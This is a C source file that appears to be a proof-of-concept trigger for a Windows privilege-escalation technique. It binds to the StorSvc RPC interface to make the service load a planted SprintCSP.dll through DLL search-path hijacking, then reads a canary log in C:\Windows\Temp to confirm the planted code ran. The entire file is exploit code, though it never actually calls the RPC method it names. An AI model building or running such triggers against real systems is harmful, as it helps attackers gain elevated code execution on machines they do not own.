#include <windows.h>
#include <stdio.h>

// StorSvc RPC interface GUID
// {BE7F785E-0E3A-4AB7-91DE-7E46E443BE29} version 1.0

#pragma comment(lib, "rpcrt4.lib")

// Simplified - call SvcRebootToFlashingMode directly via ncalrpc
void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes) { return malloc(cBytes); }
void __RPC_USER midl_user_free(void __RPC_FAR* p) { free(p); }

int main(void) {
    RPC_STATUS status;
    RPC_WSTR binding_string = NULL;
    RPC_BINDING_HANDLE hBinding = NULL;
    
    printf("[*] StorSvc SprintCSP.dll trigger\n");
    printf("[*] Attempting RPC call to SvcRebootToFlashingMode\n\n");
    
    // Try multiple endpoints
    const wchar_t* endpoints[] = {
        L"[LRPC-storsvc]",
        L"",
        NULL
    };
    
    for (int i = 0; endpoints[i]; i++) {
        status = RpcStringBindingComposeW(
            (RPC_WSTR)L"BE7F785E-0E3A-4AB7-91DE-7E46E443BE29",
            (RPC_WSTR)L"ncalrpc",
            NULL,
            (RPC_WSTR)endpoints[i],
            NULL,
            &binding_string
        );
        
        if (status != RPC_S_OK) {
            printf("[-] Compose failed for endpoint %d: 0x%08X\n", i, status);
            continue;
        }
        
        printf("[+] Binding string: %ls\n", binding_string);
        
        status = RpcBindingFromStringBindingW(binding_string, &hBinding);
        RpcStringFreeW(&binding_string);
        
        if (status != RPC_S_OK) {
            printf("[-] Bind failed: 0x%08X\n", status);
            continue;
        }
        
        printf("[+] RPC binding established\n");
        printf("[*] Connected (may trigger SprintCSP.dll load regardless of patch)\n");
        
        // Clean up
        RpcBindingFree(&hBinding);
    }
    
    // Also try to trigger via COM
    printf("\n[*] Trying COM-based trigger...\n");
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr)) {
        // StorSvc has a COM interface too
        printf("[+] COM initialized\n");
        
        // Try to trigger the storage diagnostic function
        HMODULE hStorLib = LoadLibraryW(L"StorSvc.dll");
        if (hStorLib) {
            printf("[+] StorSvc.dll loaded into our process\n");
            // This might trigger SprintCSP.dll load in OUR process first
            // which would prove the DLL search path works
            
            // Check canary
            HANDLE hFile = CreateFileA("C:\\Windows\\Temp\\vader_path_hijack.log",
                GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                char buf[4096] = {0};
                DWORD bytesRead;
                ReadFile(hFile, buf, sizeof(buf)-1, &bytesRead, NULL);
                CloseHandle(hFile);
                if (bytesRead > 0) {
                    printf("\n[!!!] CANARY FOUND:\n%s\n", buf);
                }
            }
            
            FreeLibrary(hStorLib);
        } else {
            printf("[-] Could not load StorSvc.dll: %lu\n", GetLastError());
        }
        
        CoUninitialize();
    }
    
    printf("\n[*] Done. Check C:\\Windows\\Temp\\vader_path_hijack.log\n");
    return 0;
}